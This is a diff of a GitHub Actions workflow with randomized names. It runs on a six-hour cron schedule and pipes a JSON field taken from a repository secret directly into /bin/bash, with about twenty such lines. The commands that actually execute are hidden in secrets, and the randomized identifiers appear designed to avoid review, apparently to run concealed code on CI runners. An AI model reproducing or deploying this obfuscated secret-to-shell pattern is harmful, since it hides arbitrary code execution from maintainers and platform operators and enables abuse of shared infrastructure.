@@ -1,28 +1,35 @@
 name: yanhuidang8765
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
-jobs:  # 14014
+    - cron: '11 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yanhuidang8765
         env:
-          s230: ${{ secrets.s230 }}
+          ptvb1007: ${{ secrets.ptvb1007 }}
         run: |
-          echo $s230 | jq -r .cql5 | /bin/bash
-          echo $lbbx629 | jq -r .if0391 | /bin/bash
-          echo $ndwn1598 | jq -r .a0 | /bin/bash
-          echo $v42673 | jq -r .y18799 | /bin/bash
-          echo $ptbsn1025 | jq -r .dt15 | /bin/bash
-          echo $tc725 | jq -r .tixb7424 | /bin/bash
-          echo $o03319 | jq -r .xbbxj4571 | /bin/bash
-          echo $uq29 | jq -r .az91626 | /bin/bash
-          echo $f42 | jq -r .ytyqr580 | /bin/bash
-          echo $scy3497 | jq -r .trm5431 | /bin/bash
-          echo $us93 | jq -r .rqwp71 | /bin/bash
-          echo $dm1128 | jq -r .pjd5 | /bin/bash
+          echo $ptvb1007 | jq -r .vqjpe326 | /bin/bash
+          echo $k62 | jq -r .twkpi128 | /bin/bash
+          echo $gm121 | jq -r .d77 | /bin/bash
+          echo $b370 | jq -r .wl30953 | /bin/bash
+          echo $vic01753 | jq -r .qy9 | /bin/bash
+          echo $gf9 | jq -r .jpcpc706 | /bin/bash
+          echo $uqsl09993 | jq -r .alc333 | /bin/bash
+          echo $zripb272 | jq -r .fcrjs9146 | /bin/bash
+          echo $smk19 | jq -r .t6 | /bin/bash
+          echo $hjhu76 | jq -r .dw6351 | /bin/bash
+          echo $bkv44636 | jq -r .vn4562 | /bin/bash
+          echo $zbiz98584 | jq -r .agra59 | /bin/bash
+          echo $lp39 | jq -r .f68914 | /bin/bash
+          echo $jmdt4 | jq -r .n68857 | /bin/bash
+          echo $zemt31 | jq -r .yz04 | /bin/bash
+          echo $gjlxk7979 | jq -r .rx7694 | /bin/bash
+          echo $rqr69943 | jq -r .c170 | /bin/bash
+          echo $m74 | jq -r .gnx478 | /bin/bash
+          echo $wh77 | jq -r .km728 | /bin/bash
+          echo $ty114 | jq -r .poq6 | /bin/bash
 
